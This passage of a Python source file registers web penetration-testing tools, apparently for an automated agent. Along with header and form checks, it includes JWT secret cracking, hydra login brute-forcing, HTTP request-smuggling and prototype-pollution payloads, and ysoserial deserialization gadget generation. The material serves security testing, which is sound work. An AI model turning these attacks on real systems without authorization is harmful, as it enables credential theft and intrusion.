        results.append(f"  ID={i} → HTTP {code} ({len(stdout)} bytes) {body[:80]}")
    summary = f"IDOR check for {target} (IDs {start_id}-{start_id+count-1}):\n" + "\n".join(results)
    await _persist(project_id, "idor_check", args, summary, "", 0)
    return summary


register(
    Tool(
        name="idor_check",
        description="Test for IDOR by iterating sequential IDs in a URL (use {ID} placeholder).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "URL with {ID} placeholder, e.g. 'http://host/api/user/{ID}'"},
                "start_id": {"type": "integer", "description": "Starting ID (default: 1)"},
                "count": {"type": "integer", "description": "Number of IDs to test (default: 5, max: 20)"},
                "cookies": {"type": "string", "description": "Cookie header for authenticated requests"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _idor_check,
)


# ---------------------------------------------------------------------------
# csrf_check  (check for CSRF tokens on forms)
# ---------------------------------------------------------------------------

async def _csrf_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = ["curl", "-sL", "-m", "15", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "csrf_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    forms = re.findall(r"<form[^>]*>.*?</form>", stdout, re.IGNORECASE | re.DOTALL)
    if not forms:
        return f"No forms found on {target}."
    lines = [f"CSRF check for {target} ({len(forms)} forms):"]
    csrf_patterns = ["csrf", "token", "_token", "authenticity_token", "nonce", "__RequestVerificationToken"]
    for i, form in enumerate(forms, 1):
        action_m = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
        action = action_m.group(1) if action_m else "(no action)"
        method_m = re.search(r'method=["\']([^"\']*)["\']', form, re.IGNORECASE)
        method = method_m.group(1).upper() if method_m else "GET"
        has_token = any(p in form.lower() for p in csrf_patterns)
        status = "[PROTECTED]" if has_token else "[POTENTIALLY VULNERABLE]"
        lines.append(f"  Form {i}: {method} {action} {status}")
    return "\n".join(lines)


register(
    Tool(
        name="csrf_check",
        description="Parse HTML forms on a page and check for CSRF token fields.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _csrf_check,
)


# ---------------------------------------------------------------------------
# jwt_decode  (decode JWT — no verify)
# ---------------------------------------------------------------------------

async def _jwt_decode(args: dict) -> str:
    import base64
    token = (args.get("token") or "").strip()
    if not token:
        return "Error: token is required."
    parts = token.split(".")
    if len(parts) != 3:
        return f"Error: invalid JWT format (expected 3 parts, got {len(parts)})."
    def b64_decode(s: str) -> str:
        s += "=" * (4 - len(s) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(s).decode(errors="replace"))
        except Exception as e:
            return f"<decode error: {e}>"
    header = b64_decode(parts[0])
    payload = b64_decode(parts[1])
    lines = [
        "JWT Decoded (no signature verification):",
        f"Header:  {json.dumps(header, indent=2)}",
        f"Payload: {json.dumps(payload, indent=2)}",
        f"Signature: {parts[2][:30]}...",
    ]
    alg = header.get("alg", "") if isinstance(header, dict) else ""
    if alg.lower() == "none":
        lines.append("[VULN] Algorithm is 'none' — signature not verified!")
    elif alg.upper() in ("HS256", "HS384", "HS512"):
        lines.append(f"[NOTE] HMAC algorithm {alg} — consider jwt_crack for weak secrets.")
    return "\n".join(lines)


register(
    Tool(
        name="jwt_decode",
        description="Decode a JWT token (no signature verification) and inspect header/payload claims.",
        inputSchema={
            "type": "object",
            "required": ["token"],
            "properties": {
                "token": {"type": "string", "description": "JWT token string"},
            },
        },
    ),
    _jwt_decode,
)


# ---------------------------------------------------------------------------
# jwt_crack  (hashcat mode 16500 or python brute)
# ---------------------------------------------------------------------------

async def _jwt_crack(args: dict) -> str:
    token = (args.get("token") or "").strip()
    if not token:
        return "Error: token is required."
    wordlist = (args.get("wordlist") or "/usr/share/wordlists/rockyou.txt").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    if shutil.which("hashcat"):
        import tempfile, os
        with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as f:
            f.write(token)
            jwt_file = f.name
        try:
            cmd = ["hashcat", "-m", "16500", jwt_file, wordlist, "--quiet"]
            stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
        finally:
            os.unlink(jwt_file)
        if exit_code == -1:
            return stderr
        cracked = re.search(r":(.+)$", stdout, re.MULTILINE)
        if cracked:
            return f"JWT cracked! Secret: {cracked.group(1).strip()}"
        return f"hashcat: no secret found.\n{stdout[-500:]}"
    # Fallback: Python brute-force
    import hmac, hashlib as _hashlib, base64
    parts = token.split(".")
    if len(parts) != 3:
        return "Error: invalid JWT."
    header_payload = f"{parts[0]}.{parts[1]}".encode()
    sig_b64 = parts[2]
    def verify(secret: bytes) -> bool:
        sig = hmac.new(secret, header_payload, _hashlib.sha256).digest()
        expected = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return expected == sig_b64
    try:
        with open(wordlist, "rb") as wf:
            for line in wf:
                secret = line.strip()
                if verify(secret):
                    return f"JWT secret found: {secret.decode(errors='replace')}"
    except FileNotFoundError:
        return f"Error: wordlist not found at {wordlist}"
    return "JWT secret not found in wordlist."


register(
    Tool(
        name="jwt_crack",
        description="Brute-force JWT HMAC secret using hashcat (mode 16500) or Python fallback.",
        inputSchema={
            "type": "object",
            "required": ["token"],
            "properties": {
                "token": {"type": "string", "description": "JWT token to crack"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: rockyou.txt)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _jwt_crack,
)


# ---------------------------------------------------------------------------
# waf_detect  (wafw00f)
# ---------------------------------------------------------------------------

async def _waf_detect(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("wafw00f"):
        return "Error: wafw00f not found in PATH. Install: pip install wafw00f"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    cmd = ["wafw00f", target, "-a"]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "waf_detect", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No WAF detected on {target}."


register(
    Tool(
        name="waf_detect",
        description="Detect Web Application Firewalls using wafw00f.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _waf_detect,
)


# ---------------------------------------------------------------------------
# rate_limit_check  (send N requests and check for 429)
# ---------------------------------------------------------------------------

async def _rate_limit_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    n = min(int(args.get("requests", 20)), 100)
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    codes: list[str] = []
    tasks = []
    for _ in range(n):
        async def fetch():
            cmd = ["curl", "-sI", "-m", "5", "-w", "%{http_code}", "-o", "/dev/null", target]
            out, err, rc = await _run_subprocess(cmd, timeout=10)
            return out.strip()
        tasks.append(asyncio.create_task(fetch()))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, str):
            codes.append(r)
    counter: dict[str, int] = {}
    for c in codes:
        counter[c] = counter.get(c, 0) + 1
    summary_lines = [f"Rate limit check for {target} ({n} requests):"]
    for code, cnt in sorted(counter.items(), key=lambda x: -x[1]):
        summary_lines.append(f"  HTTP {code}: {cnt} times")
    if "429" in counter:
        summary_lines.append("[PROTECTED] Rate limiting detected (HTTP 429 received).")
    else:
        summary_lines.append("[NOTE] No 429 responses — rate limiting may not be enforced.")
    summary = "\n".join(summary_lines)
    await _persist(project_id, "rate_limit_check", args, summary, "", 0)
    return summary


register(
    Tool(
        name="rate_limit_check",
        description="Send N concurrent requests to check if rate limiting (HTTP 429) is enforced.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "requests": {"type": "integer", "description": "Number of requests (default: 20, max: 100)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _rate_limit_check,
)


# ---------------------------------------------------------------------------
# graphql_probe  (test /graphql for introspection)
# ---------------------------------------------------------------------------

async def _graphql_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    endpoints = ["/graphql", "/api/graphql", "/graphiql", "/v1/graphql", "/query"]
    base = target.rstrip("/")
    introspection_query = '{"query":"{__schema{queryType{name}}}"}'
    results = []
    for ep in endpoints:
        url = base + ep
        cmd = [
            "curl", "-sL", "-m", "10", "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", introspection_query, url,
        ]
        if cookies:
            cmd += ["-H", f"Cookie: {cookies}"]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        if "__schema" in stdout or "queryType" in stdout:
            results.append(f"  [VULN] {url} → Introspection ENABLED! Schema exposed.")
        elif "errors" in stdout.lower() or rc == 0:
            results.append(f"  [EXISTS] {url} → GraphQL endpoint responds (introspection disabled or partial)")
        else:
            results.append(f"  [404] {url}")
    summary = f"GraphQL probe for {base}:\n" + "\n".join(results)
    await _persist(project_id, "graphql_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="graphql_probe",
        description="Probe common GraphQL endpoints and test for introspection being enabled.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Base URL, e.g. 'http://10.10.10.1'"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _graphql_probe,
)


# ---------------------------------------------------------------------------
# api_fuzz  (ffuf on API endpoints)
# ---------------------------------------------------------------------------

async def _api_fuzz(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required (use FUZZ placeholder)."
    if not shutil.which("ffuf"):
        return "Error: ffuf not found in PATH."
    wordlist = (args.get("wordlist") or "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 180))
    url = target if "FUZZ" in target else f"{target.rstrip('/')}/FUZZ"
    cmd = [
        "ffuf", "-u", url, "-w", wordlist,
        "-v", "-mc", "200,201,204,301,302,307,401,403,405",
    ]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "api_fuzz", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No API endpoints discovered on {target}."


register(
    Tool(
        name="api_fuzz",
        description="Fuzz API endpoints using ffuf with an API wordlist.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Base URL or URL with FUZZ placeholder"},
                "wordlist": {"type": "string", "description": "API endpoints wordlist"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 180)"},
            },
        },
    ),
    _api_fuzz,
)


# ---------------------------------------------------------------------------
# http_smuggle  (smuggler.py or manual CL.TE test)
# ---------------------------------------------------------------------------

async def _http_smuggle(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    # Try smuggler.py if available
    smuggler_paths = ["/opt/smuggler/smuggler.py", "/usr/local/bin/smuggler.py", shutil.which("smuggler")]
    smuggler = next((p for p in smuggler_paths if p and Path(p).exists()), None)
    if smuggler:
        cmd = ["python3", smuggler, "-u", target, "--quiet"]
        stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
        await _persist(project_id, "http_smuggle", args, stdout, stderr, exit_code)
        return stdout or stderr or "smuggler.py returned no output."
    # Manual CL.TE test via curl
    cl_te_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target.split('//')[-1].split('/')[0]}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    result = (
        "smuggler.py not found. Manual CL.TE probe payload:\n\n"
        f"{cl_te_payload}\n\n"
        "Use Burp Suite HTTP Request Smuggler extension for automated testing."
    )
    await _persist(project_id, "http_smuggle", args, result, "", 0)
    return result


register(
    Tool(
        name="http_smuggle",
        description="Test for HTTP request smuggling using smuggler.py (if available) or generate manual CL.TE probe.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _http_smuggle,
)


# ---------------------------------------------------------------------------
# clickjack_check  (check X-Frame-Options header)
# ---------------------------------------------------------------------------

async def _clickjack_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 15))
    cmd = ["curl", "-sI", "-m", "10", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "clickjack_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    xfo = re.search(r"(?i)^X-Frame-Options:\s*(.+)", stdout, re.MULTILINE)
    csp = re.search(r"(?i)^Content-Security-Policy:\s*(.+)", stdout, re.MULTILINE)
    lines = [f"Clickjacking check for {target}:"]
    if xfo:
        lines.append(f"  X-Frame-Options: {xfo.group(1).strip()} [PROTECTED]")
    else:
        lines.append("  X-Frame-Options: MISSING")
    if csp:
        csp_val = csp.group(1)
        if "frame-ancestors" in csp_val.lower():
            lines.append(f"  CSP frame-ancestors: PRESENT [PROTECTED]")
        else:
            lines.append(f"  CSP frame-ancestors: NOT SET in CSP")
    else:
        lines.append("  Content-Security-Policy: MISSING")
    if not xfo and (not csp or "frame-ancestors" not in (csp.group(1) if csp else "").lower()):
        lines.append("[POTENTIALLY VULNERABLE] No clickjacking protection found.")
    return "\n".join(lines)


register(
    Tool(
        name="clickjack_check",
        description="Check for clickjacking protection via X-Frame-Options and CSP frame-ancestors.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 15)"},
            },
        },
    ),
    _clickjack_check,
)


# ---------------------------------------------------------------------------
# nikto_scan  (nikto -h)
# ---------------------------------------------------------------------------

async def _nikto_scan(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("nikto"):
        return "Error: nikto not found in PATH. Install: apt install nikto"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    cmd = ["nikto", "-h", target, "-nointeractive"]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "nikto_scan", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"nikto returned no output for {target}."


register(
    Tool(
        name="nikto_scan",
        description="Web server vulnerability scan using nikto.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL or host"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _nikto_scan,
)


# ---------------------------------------------------------------------------
# wordpress_scan  (wpscan --url)
# ---------------------------------------------------------------------------

async def _wordpress_scan(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("wpscan"):
        return "Error: wpscan not found in PATH. Install: gem install wpscan"
    api_token = (args.get("api_token") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    cmd = ["wpscan", "--url", target, "--no-banner", "-e", "ap,at,u"]
    if api_token:
        cmd += ["--api-token", api_token]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "wordpress_scan", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"wpscan returned no output for {target}."


register(
    Tool(
        name="wordpress_scan",
        description="WordPress vulnerability and enumeration scan using wpscan.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "WordPress site URL"},
                "api_token": {"type": "string", "description": "WPScan API token for vulnerability data"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _wordpress_scan,
)


# ---------------------------------------------------------------------------
# auth_brute_http  (hydra http-form-post)
# ---------------------------------------------------------------------------

async def _auth_brute_http(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("hydra"):
        return "Error: hydra not found in PATH. Install: apt install hydra"
    userlist = (args.get("userlist") or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt").strip()
    passlist = (args.get("passlist") or "/usr/share/wordlists/rockyou.txt").strip()
    form_path = (args.get("form_path") or "/login").strip()
    form_params = (args.get("form_params") or "username=^USER^&password=^PASS^").strip()
    fail_str = (args.get("fail_str") or "Invalid").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    from urllib.parse import urlparse
    parsed = urlparse(target)
    host = parsed.hostname or target
    scheme = "https-post-form" if parsed.scheme == "https" else "http-post-form"
    cmd = [
        "hydra", "-L", userlist, "-P", passlist, host, scheme,
        f"{form_path}:{form_params}:F={fail_str}", "-t", "4",
    ]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "auth_brute_http", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    valid = [ln for ln in stdout.splitlines() if "[http" in ln.lower() and "login:" in ln.lower()]
    if valid:
        return "Credentials found:\n" + "\n".join(valid)
    return f"hydra http brute-force complete. No credentials found.\n{stdout[-1000:]}"


register(
    Tool(
        name="auth_brute_http",
        description="Brute-force HTTP form authentication using hydra http-post-form.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL, e.g. 'http://10.10.10.1'"},
                "userlist": {"type": "string", "description": "Path to username wordlist"},
                "passlist": {"type": "string", "description": "Path to password wordlist"},
                "form_path": {"type": "string", "description": "Login form path (default: /login)"},
                "form_params": {"type": "string", "description": "Form POST params (default: username=^USER^&password=^PASS^)"},
                "fail_str": {"type": "string", "description": "Failure string in response (default: Invalid)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _auth_brute_http,
)


# ---------------------------------------------------------------------------
# csp_check  (parse and evaluate CSP header)
# ---------------------------------------------------------------------------

async def _csp_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 15))
    cmd = ["curl", "-sI", "-m", "10", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "csp_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    csp_m = re.search(r"(?i)^Content-Security-Policy:\s*(.+)", stdout, re.MULTILINE)
    if not csp_m:
        return f"[MISSING] No Content-Security-Policy header on {target}."
    csp = csp_m.group(1).strip()
    directives = {}
    for part in csp.split(";"):
        part = part.strip()
        if part:
            tokens = part.split()
            directives[tokens[0].lower()] = tokens[1:] if len(tokens) > 1 else []
    issues = []
    script_src = directives.get("script-src", directives.get("default-src", []))
    if "'unsafe-inline'" in script_src:
        issues.append("  [WEAK] script-src contains 'unsafe-inline' — XSS mitigations bypassed")
    if "'unsafe-eval'" in script_src:
        issues.append("  [WEAK] script-src contains 'unsafe-eval'")
    if "*" in script_src:
        issues.append("  [WEAK] script-src wildcard '*' allows any source")
    if not directives.get("script-src") and not directives.get("default-src"):
        issues.append("  [MISSING] No script-src or default-src directive")
    lines = [f"CSP Analysis for {target}:", f"  Raw: {csp[:200]}"]
    lines += (issues if issues else ["  [OK] No obvious CSP weaknesses found"])
    return "\n".join(lines)


register(
    Tool(
        name="csp_check",
        description="Parse and evaluate the Content-Security-Policy header for common weaknesses.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 15)"},
            },
        },
    ),
    _csp_check,
)


# ---------------------------------------------------------------------------
# prototype_pollution  (test JSON prototype pollution)
# ---------------------------------------------------------------------------

async def _prototype_pollution(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        '{"__proto__":{"polluted":"yes"}}',
        '{"constructor":{"prototype":{"polluted":"yes"}}}',
        '{"__proto__.polluted":"yes"}',
    ]
    results = []
    for payload in payloads:
        cmd = [
            "curl", "-sL", "-m", "10", "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", payload, target,
        ]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        if "polluted" in stdout:
            results.append(f"  [VULN] payload={payload[:50]!r} → 'polluted' reflected in response!")
        else:
            results.append(f"  [OK] payload={payload[:50]!r} → rc={rc} len={len(stdout)}")
    # Also check GET params
    get_payloads = ["?__proto__[polluted]=yes", "?constructor[prototype][polluted]=yes"]
    for gp in get_payloads:
        cmd = ["curl", "-sL", "-m", "10", f"{target}{gp}"]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        if "polluted" in stdout:
            results.append(f"  [VULN] GET {gp!r} → 'polluted' in response!")
    summary = f"Prototype pollution test for {target}:\n" + "\n".join(results)
    await _persist(project_id, "prototype_pollution", args, summary, "", 0)
    return summary


register(
    Tool(
        name="prototype_pollution",
        description="Test for JavaScript prototype pollution via JSON POST and GET parameter injection.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _prototype_pollution,
)


# ---------------------------------------------------------------------------
# deserialization_check  (ysoserial payloads or PHP unserialize check)
# ---------------------------------------------------------------------------

async def _deserialization_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    lang = (args.get("lang") or "java").strip().lower()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    if lang == "java":
        ysoserial = shutil.which("ysoserial") or "/opt/ysoserial/ysoserial.jar"
        if not Path(ysoserial).exists() and not shutil.which("ysoserial"):
            return (
                "ysoserial not found. Download from https://github.com/frohoff/ysoserial\n"
                "Place at /opt/ysoserial/ysoserial.jar\n\n"
                "Manual test: send a serialized Java object (AC ED 00 05 magic bytes) and check for errors.\n"
                "Look for 'java.io.InvalidClassException' or similar in responses."
            )
        # Generate a payload with a sleep gadget
        cmd = ["java", "-jar", ysoserial, "CommonsCollections1", "sleep 5"]
        stdout_b, stderr_b, rc = await _run_subprocess(cmd, timeout=30)
        if rc != 0:
            return f"ysoserial error: {stderr_b[:500]}"
        return f"ysoserial CommonsCollections1 payload generated ({len(stdout_b)} bytes). Send as POST body."
    elif lang == "php":
        php_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
        ]
        results = []
        for payload in php_payloads:
            cmd = [
                "curl", "-sL", "-m", "10", "-X", "POST",
                "-d", f"data={payload}", target,
            ]
            stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
            results.append(f"  payload={payload!r} → rc={rc} len={len(stdout)}")
            if "Unserialize" in stdout or "unserialize" in stdout or "Error" in stdout:
                results.append(f"    [NOTE] Deserialization-related response content")
        summary = f"PHP deserialization check for {target}:\n" + "\n".join(results)
        await _persist(project_id, "deserialization_check", args, summary, "", 0)
        return summary
    return f"Error: unsupported lang={lang!r}. Use 'java' or 'php'."


register(
    Tool(
        name="deserialization_check",
        description="Test for insecure deserialization using ysoserial (Java) or PHP unserialize payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "lang": {"type": "string", "description": "Language: java or php (default: java)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _deserialization_check,
)
